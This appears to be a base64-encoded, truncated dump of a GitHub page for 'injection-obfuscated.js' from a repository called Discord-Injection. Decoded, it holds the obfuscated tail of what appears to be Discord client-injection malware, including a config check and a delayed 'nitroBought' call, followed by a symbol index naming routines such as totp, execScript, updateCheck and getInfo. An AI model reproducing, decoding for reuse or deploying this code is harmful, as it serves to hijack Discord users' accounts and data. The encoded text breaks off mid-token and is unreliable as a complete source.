3MyldW3g3KDB4YTIpXSgnY29uZmlybScpXHUwMDI2XHUwMDI2WVt4NygweGIyKV09PT14NygweGJmKTppZighY29uZmlnW3g3KDB4MTBhKV0pcmV0dXJuO3NldFRpbWVvdXQoKCk9XHUwMDNle2NvbnN0IHg4PXg3O25pdHJvQm91Z2h0KEgpW3g4KDB4MTAxKV0oY29uc29sZVt4OCgweDdmKV0pO30sMHgxZDRjKTticmVhaztkZWZhdWx0OmJyZWFrO319KSxtb2R1bGVbUygweDEyZCldPXJlcXVpcmUoUygweDEwNykpOyJdLCJzdHlsaW5nRGlyZWN0aXZlcyI6W1tdXSwiY3N2IjpudWxsLCJjc3ZFcnJvciI6bnVsbCwiZGVwZW5kYWJvdEluZm8iOnsic2hvd0NvbmZpZ3VyYXRpb25CYW5uZXIiOmZhbHNlLCJjb25maWdGaWxlUGF0aCI6bnVsbCwibmV0d29ya0RlcGVuZGFib3RQYXRoIjoiL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9uZXR3b3JrL3VwZGF0ZXMiLCJkaXNtaXNzQ29uZmlndXJhdGlvbk5vdGljZVBhdGgiOiIvc2V0dGluZ3MvZGlzbWlzcy1ub3RpY2UvZGVwZW5kYWJvdF9jb25maWd1cmF0aW9uX25vdGljZSIsImNvbmZpZ3VyYXRpb25Ob3RpY2VEaXNtaXNzZWQiOm51bGwsInJlcG9BbGVydHNQYXRoIjoiL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9zZWN1cml0eS9kZXBlbmRhYm90IiwicmVwb1NlY3VyaXR5QW5kQW5hbHlzaXNQYXRoIjoiL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9zZXR0aW5ncy9zZWN1cml0eV9hbmFseXNpcyIsInJlcG9Pd25lcklzT3JnIjpmYWxzZSwiY3VycmVudFVzZXJDYW5BZG1pblJlcG8iOmZhbHNlfSwiZGlzcGxheU5hbWUiOiJpbmplY3Rpb24tb2JmdXNjYXRlZC5qcyIsImRpc3BsYXlVcmwiOiJodHRwczovL2dpdGh1Yi5jb20vc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL2Jsb2IvbWFpbi9pbmplY3Rpb24tb2JmdXNjYXRlZC5qcz9yYXc9dHJ1ZSIsImhlYWRlckluZm8iOnsiYmxvYlNpemUiOiIyMi41IEtCIiwiZGVsZXRlSW5mbyI6eyJkZWxldGVUb29sdGlwIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIG1ha2Ugb3IgcHJvcG9zZSBjaGFuZ2VzIn0sImVkaXRJbmZvIjp7ImVkaXRUb29sdGlwIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIG1ha2Ugb3IgcHJvcG9zZSBjaGFuZ2VzIn0sImdoRGVza3RvcFBhdGgiOiJodHRwczovL2Rlc2t0b3AuZ2l0aHViLmNvbSIsImdpdExmc1BhdGgiOm51bGwsIm9uQnJhbmNoIjp0cnVlLCJzaG9ydFBhdGgiOiJlYThlM2M4Iiwic2l0ZU5hdkxvZ2luUGF0aCI6Ii9sb2dpbj9yZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZnaXRodWIuY29tJTJGc2tvY2h3YXNoZXJlJTJGRGlzY29yZC1JbmplY3Rpb24lMkZibG9iJTJGbWFpbiUyRmluamVjdGlvbi1vYmZ1c2NhdGVkLmpzIiwiaXNDU1YiOmZhbHNlLCJpc1JpY2h0ZXh0IjpmYWxzZSwidG9jIjpudWxsLCJsaW5lSW5mbyI6eyJ0cnVuY2F0ZWRMb2MiOiIxIiwidHJ1bmNhdGVkU2xvYyI6IjEifSwibW9kZSI6ImZpbGUifSwiaW1hZ2UiOmZhbHNlLCJpc0NvZGVvd25lcnNGaWxlIjpudWxsLCJpc1BsYWluIjpmYWxzZSwiaXNWYWxpZExlZ2FjeUlzc3VlVGVtcGxhdGUiOmZhbHNlLCJpc3N1ZVRlbXBsYXRlSGVscFVybCI6Imh0dHBzOi8vZG9jcy5naXRodWIuY29tL2FydGljbGVzL2Fib3V0LWlzc3VlLWFuZC1wdWxsLXJlcXVlc3QtdGVtcGxhdGVzIiwiaXNzdWVUZW1wbGF0ZSI6bnVsbCwiZGlzY3Vzc2lvblRlbXBsYXRlIjpudWxsLCJsYW5ndWFnZSI6IkphdmFTY3JpcHQiLCJsYW5ndWFnZUlEIjoxODMsImxhcmdlIjpmYWxzZSwibG9nZ2VkSW4iOmZhbHNlLCJuZXdEaXNjdXNzaW9uUGF0aCI6Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vZGlzY3Vzc2lvbnMvbmV3IiwibmV3SXNzdWVQYXRoIjoiL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9pc3N1ZXMvbmV3IiwicGxhblN1cHBvcnRJbmZvIjp7InJlcG9Jc0ZvcmsiOm51bGwsInJlcG9Pd25lZEJ5Q3VycmVudFVzZXIiOm51bGwsInJlcXVlc3RGdWxsUGF0aCI6Ii9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vYmxvYi9tYWluL2luamVjdGlvbi1vYmZ1c2NhdGVkLmpzIiwic2hvd0ZyZWVPcmdHYXRlZEZlYXR1cmVNZXNzYWdlIjpudWxsLCJzaG93UGxhblN1cHBvcnRCYW5uZXIiOm51bGwsInVwZ3JhZGVEYXRhQXR0cmlidXRlcyI6bnVsbCwidXBncmFkZVBhdGgiOm51bGx9LCJwdWJsaXNoQmFubmVyc0luZm8iOnsiZGlzbWlzc0FjdGlvbk5vdGljZVBhdGgiOiIvc2V0dGluZ3MvZGlzbWlzcy1ub3RpY2UvcHVibGlzaF9hY3Rpb25fZnJvbV9kb2NrZXJmaWxlIiwiZGlzbWlzc1N0YWNrTm90aWNlUGF0aCI6Ii9zZXR0aW5ncy9kaXNtaXNzLW5vdGljZS9wdWJsaXNoX3N0YWNrX2Zyb21fZmlsZSIsInJlbGVhc2VQYXRoIjoiL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9yZWxlYXNlcy9uZXc/bWFya2V0cGxhY2U9dHJ1ZSIsInNob3dQdWJsaXNoQWN0aW9uQmFubmVyIjpmYWxzZSwic2hvd1B1Ymxpc2hTdGFja0Jhbm5lciI6ZmFsc2V9LCJyYXdCbG9iVXJsIjoiaHR0cHM6Ly9naXRodWIuY29tL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9yYXcvbWFpbi9pbmplY3Rpb24tb2JmdXNjYXRlZC5qcyIsInJlbmRlckltYWdlT3JSYXciOmZhbHNlLCJyaWNoVGV4dCI6bnVsbCwicmVuZGVyZWRGaWxlSW5mbyI6bnVsbCwic2hvcnRQYXRoIjpudWxsLCJ0YWJTaXplIjo4LCJ0b3BCYW5uZXJzSW5mbyI6eyJvdmVycmlkaW5nR2xvYmFsRnVuZGluZ0ZpbGUiOmZhbHNlLCJnbG9iYWxQcmVmZXJyZWRGdW5kaW5nUGF0aCI6bnVsbCwicmVwb093bmVyIjoic2tvY2h3YXNoZXJlIiwicmVwb05hbWUiOiJEaXNjb3JkLUluamVjdGlvbiIsInNob3dJbnZhbGlkQ2l0YXRpb25XYXJuaW5nIjpmYWxzZSwiY2l0YXRpb25IZWxwVXJsIjoiaHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vZ2l0aHViL2NyZWF0aW5nLWNsb25pbmctYW5kLWFyY2hpdmluZy1yZXBvc2l0b3JpZXMvY3JlYXRpbmctYS1yZXBvc2l0b3J5LW9uLWdpdGh1Yi9hYm91dC1jaXRhdGlvbi1maWxlcyIsInNob3dEZXBlbmRhYm90Q29uZmlndXJhdGlvbkJhbm5lciI6ZmFsc2UsImFjdGlvbnNPbmJvYXJkaW5nVGlwIjpudWxsfSwidHJ1bmNhdGVkIjpmYWxzZSwidmlld2FibGUiOnRydWUsIndvcmtmbG93UmVkaXJlY3RVcmwiOm51bGwsInN5bWJvbHMiOnsidGltZWRPdXQiOmZhbHNlLCJub3RBbmFseXplZCI6ZmFsc2UsInN5bWJvbHMiOlt7Im5hbWUiOiJwYXJpdHlfMzIiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxMzQ3LCJpZGVudEVuZCI6MTM1NiwiZXh0ZW50U3RhcnQiOjEzMzgsImV4dGVudEVuZCI6MTM3OCwiZnVsbHlRdWFsaWZpZWROYW1lIjoicGFyaXR5XzMyIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTM0N30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTM1Nn19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTMzOH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTM3OH19fSx7Im5hbWUiOiJjaF8zMiIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjEzODcsImlkZW50RW5kIjoxMzkyLCJleHRlbnRTdGFydCI6MTM3OCwiZXh0ZW50RW5kIjoxNDE3LCJmdWxseVF1YWxpZmllZE5hbWUiOiJjaF8zMiIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEzODd9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEzOTJ9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEzNzh9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0MTd9fX0seyJuYW1lIjoibWFqXzMyIiwia2luZCI6ImZ1bmN0aW9uIiwiaWRlbnRTdGFydCI6MTQyNiwiaWRlbnRFbmQiOjE0MzIsImV4dGVudFN0YXJ0IjoxNDE3LCJleHRlbnRFbmQiOjE0NjAsImZ1bGx5UXVhbGlmaWVkTmFtZSI6Im1hal8zMiIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0MjZ9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0MzJ9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0MTd9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0NjB9fX0seyJuYW1lIjoicm90bF8zMiIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE0NjksImlkZW50RW5kIjoxNDc2LCJleHRlbnRTdGFydCI6MTQ2MCwiZXh0ZW50RW5kIjoxNTA2LCJmdWxseVF1YWxpZmllZE5hbWUiOiJyb3RsXzMyIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQ2OX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQ3Nn19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQ2MH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTUwNn19fSx7Im5hbWUiOiJzYWZlQWRkXzMyXzIiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNTE1LCJpZGVudEVuZCI6MTUyNywiZXh0ZW50U3RhcnQiOjE1MDYsImV4dGVudEVuZCI6MTYyOSwiZnVsbHlRdWFsaWZpZWROYW1lIjoic2FmZUFkZF8zMl8yIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTUxNX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTUyN319LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTUwNn0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTYyOX19fSx7Im5hbWUiOiJzYWZlQWRkXzMyXzUiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNjM4LCJpZGVudEVuZCI6MTY1MCwiZXh0ZW50U3RhcnQiOjE2MjksImV4dGVudEVuZCI6MTgyNCwiZnVsbHlRdWFsaWZpZWROYW1lIjoic2FmZUFkZF8zMl81IiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTYzOH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTY1MH19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTYyOX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTgyNH19fSx7Im5hbWUiOiJiaW5iMmhleCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE4MzMsImlkZW50RW5kIjoxODQxLCJleHRlbnRTdGFydCI6MTgyNCwiZXh0ZW50RW5kIjoyMDA3LCJmdWxseVF1YWxpZmllZE5hbWUiOiJiaW5iMmhleCIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE4MzN9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE4NDF9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE4MjR9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjIwMDd9fX0seyJuYW1lIjoiZ2V0SCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjIwMTYsImlkZW50RW5kIjoyMDIwLCJleHRlbnRTdGFydCI6MjAwNywiZXh0ZW50RW5kIjoyMDg3LCJmdWxseVF1YWxpZmllZE5hbWUiOiJnZXRIIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjAxNn0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjAyMH19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjAwN30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjA4N319fSx7Im5hbWUiOiJyb3VuZFNIQTEiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoyMDk2LCJpZGVudEVuZCI6MjEwNSwiZXh0ZW50U3RhcnQiOjIwODcsImV4dGVudEVuZCI6MjY3NSwiZnVsbHlRdWFsaWZpZWROYW1lIjoicm91bmRTSEExIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjA5Nn0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjEwNX19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjA4N30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjY3NX19fSx7Im5hbWUiOiJmaW5hbGl6ZVNIQTEiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoyNjg0LCJpZGVudEVuZCI6MjY5NiwiZXh0ZW50U3RhcnQiOjI2NzUsImV4dGVudEVuZCI6MjkxNCwiZnVsbHlRdWFsaWZpZWROYW1lIjoiZmluYWxpemVTSEExIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjY4NH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjY5Nn19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjY3NX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MjkxNH19fSx7Im5hbWUiOiJoZXgyYmluYiIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjI5MjMsImlkZW50RW5kIjoyOTMxLCJleHRlbnRTdGFydCI6MjkxNCwiZXh0ZW50RW5kIjozMjc1LCJmdWxseVF1YWxpZmllZE5hbWUiOiJoZXgyYmluYiIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjI5MjN9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjI5MzF9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjI5MTR9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjMyNzV9fX0seyJuYW1lIjoianNTSEEiLCJraW5kIjoiY2xhc3MiLCJpZGVudFN0YXJ0IjozMjgxLCJpZGVudEVuZCI6MzI4NiwiZXh0ZW50U3RhcnQiOjMyNzUsImV4dGVudEVuZCI6NDI2OCwiZnVsbHlRdWFsaWZpZWROYW1lIjoianNTSEEiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjozMjgxfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjozMjg2fX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjozMjc1fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjo0MjY4fX19LHsibmFtZSI6ImNvbnN0cnVjdG9yIiwia2luZCI6Im1ldGhvZCIsImlkZW50U3RhcnQiOjMyODcsImlkZW50RW5kIjozMjk4LCJleHRlbnRTdGFydCI6MzI4NywiZXh0ZW50RW5kIjo0MjY3LCJmdWxseVF1YWxpZmllZE5hbWUiOiJqc1NIQS5jb25zdHJ1Y3RvciIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjMyODd9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjMyOTh9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjMyODd9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQyNjd9fX0seyJuYW1lIjoiWCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjQxNjAsImlkZW50RW5kIjo0MTYxLCJleHRlbnRTdGFydCI6NDE2MCwiZXh0ZW50RW5kIjo0MTk0LCJmdWxseVF1YWxpZmllZE5hbWUiOiJqc1NIQS5YIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6NDE2MH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6NDE2MX19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6NDE2MH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6NDE5NH19fSx7Im5hbWUiOiJ0b3RwIiwia2luZCI6ImZ1bmN0aW9uIiwiaWRlbnRTdGFydCI6NDUzNywiaWRlbnRFbmQiOjQ1NDEsImV4dGVudFN0YXJ0Ijo0NTI4LCJleHRlbnRFbmQiOjQ5MDIsImZ1bGx5UXVhbGlmaWVkTmFtZSI6InRvdHAiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjo0NTM3fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjo0NTQxfX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjo0NTI4fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjo0OTAyfX19LHsibmFtZSI6ImhleDJkZWMiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0Ijo0OTExLCJpZGVudEVuZCI6NDkxOCwiZXh0ZW50U3RhcnQiOjQ5MDIsImV4dGVudEVuZCI6NDk0NywiZnVsbHlRdWFsaWZpZWROYW1lIjoiaGV4MmRlYyIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5MTF9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5MTh9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5MDJ9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5NDd9fX0seyJuYW1lIjoieCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjQ5NTYsImlkZW50RW5kIjo0OTU3LCJleHRlbnRTdGFydCI6NDk0NywiZXh0ZW50RW5kIjoxMTg1OSwiZnVsbHlRdWFsaWZpZWROYW1lIjoieCIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5NTZ9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5NTd9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjQ5NDd9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjExODU3fX19LHsibmFtZSI6IngiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxMTgyMiwiaWRlbnRFbmQiOjExODIzLCJleHRlbnRTdGFydCI6MTE4MjIsImV4dGVudEVuZCI6MTE4NDYsImZ1bGx5UXVhbGlmaWVkTmFtZSI6IngiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMTgyMH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTE4MjF9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjExODIwfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMTg0NH19fSx7Im5hbWUiOiJkZWMyaGV4Iiwia2luZCI6ImZ1bmN0aW9uIiwiaWRlbnRTdGFydCI6MTE4NjgsImlkZW50RW5kIjoxMTg3NSwiZXh0ZW50U3RhcnQiOjExODU5LCJleHRlbnRFbmQiOjExOTQ0LCJmdWxseVF1YWxpZmllZE5hbWUiOiJkZWMyaGV4IiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTE4NjZ9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjExODczfX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMTg1N30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTE5NDJ9fX0seyJuYW1lIjoiYmFzZTMydG9oZXgiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxMTk1MywiaWRlbnRFbmQiOjExOTY0LCJleHRlbnRTdGFydCI6MTE5NDQsImV4dGVudEVuZCI6MTIzMDcsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImJhc2UzMnRvaGV4IiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTE5NTF9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjExOTYyfX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMTk0Mn0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTIzMDV9fX0seyJuYW1lIjoibGVmdHBhZCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjEyMzE2LCJpZGVudEVuZCI6MTIzMjMsImV4dGVudFN0YXJ0IjoxMjMwNywiZXh0ZW50RW5kIjoxMjQxMiwiZnVsbHlRdWFsaWZpZWROYW1lIjoibGVmdHBhZCIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEyMzE0fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMjMyMX19LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTIzMDV9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEyNDEwfX19LHsibmFtZSI6IkMiLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxMjc4NSwiaWRlbnRFbmQiOjEyNzg2LCJleHRlbnRTdGFydCI6MTI3NzYsImV4dGVudEVuZCI6MTI4NjYsImZ1bGx5UXVhbGlmaWVkTmFtZSI6IkMiLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMjc4M30sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTI3ODR9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEyNzc0fSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMjg2NH19fSx7Im5hbWUiOiJDIiwia2luZCI6ImZ1bmN0aW9uIiwiaWRlbnRTdGFydCI6MTI4MTEsImlkZW50RW5kIjoxMjgxMiwiZXh0ZW50U3RhcnQiOjEyODExLCJleHRlbnRFbmQiOjEyODU3LCJmdWxseVF1YWxpZmllZE5hbWUiOiJDIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTI4MDl9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEyODEwfX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMjgwOX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTI4NTV9fX0seyJuYW1lIjoidXBkYXRlQ2hlY2siLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxMjg3NSwiaWRlbnRFbmQiOjEyODg2LCJleHRlbnRTdGFydCI6MTI4NjYsImV4dGVudEVuZCI6MTQwMzksImZ1bGx5UXVhbGlmaWVkTmFtZSI6InVwZGF0ZUNoZWNrIiwiaWRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTI4NzN9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjEyODg0fX0sImV4dGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxMjg2NH0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQwMzd9fX0seyJuYW1lIjoiZXhlY1NjcmlwdCIsImtpbmQiOiJmdW5jdGlvbiIsImlkZW50U3RhcnQiOjE0MDQ1LCJpZGVudEVuZCI6MTQwNTUsImV4dGVudFN0YXJ0IjoxNDA0NSwiZXh0ZW50RW5kIjoxNDE1MCwiZnVsbHlRdWFsaWZpZWROYW1lIjoiZXhlY1NjcmlwdCIsImlkZW50VXRmMTYiOnsic3RhcnQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0MDQzfSwiZW5kIjp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDA1M319LCJleHRlbnRVdGYxNiI6eyJzdGFydCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQwNDN9LCJlbmQiOnsibGluZU51bWJlciI6MCwidXRmMTZDb2wiOjE0MTQ4fX19LHsibmFtZSI6ImdldEluZm8iLCJraW5kIjoiZnVuY3Rpb24iLCJpZGVudFN0YXJ0IjoxNDE1MSwiaWRlbnRFbmQiOjE0MTU4LCJleHRlbnRTdGFydCI6MTQxNTEsImV4dGVudEVuZCI6MTQ0NDYsImZ1bGx5UXVhbGlmaWVkTmFtZSI6ImdldEluZm8iLCJpZGVudFV0ZjE2Ijp7InN0YXJ0Ijp7ImxpbmVOdW1iZXIiOjAsInV0ZjE2Q29sIjoxNDE0OX0sImVuZCI6eyJsaW5lTnVtYmVyIjowLCJ1dGYxNkNvbCI6MTQxNTZ9fSwiZXh0ZW50VXRmMTYiOnsic3RhcnQiOnsibGluZ